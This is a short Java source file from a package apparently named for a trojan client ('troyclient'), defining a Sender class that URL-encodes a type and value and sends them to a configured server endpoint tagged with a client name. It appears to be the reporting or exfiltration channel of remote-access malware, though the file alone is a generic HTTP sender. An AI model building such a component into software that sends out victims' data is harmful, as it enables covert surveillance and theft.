package ch.lebois.troyclient.service;

import java.io.IOException;
import java.net.URLEncoder;

public class Sender {

    public void send(String type, String value) {
        try {
            String specUrl = GetContext.URL + "/reciver/" + GetContext.CLIENT_NAME + "/?type=" + URLEncoder.encode(type, "UTF-8")
                             + "&value=" + URLEncoder.encode(value, "UTF-8");
            new WebHandler(specUrl).getContent();
        } catch (IOException e) {
            e.printStackTrace();
        }


    }

}
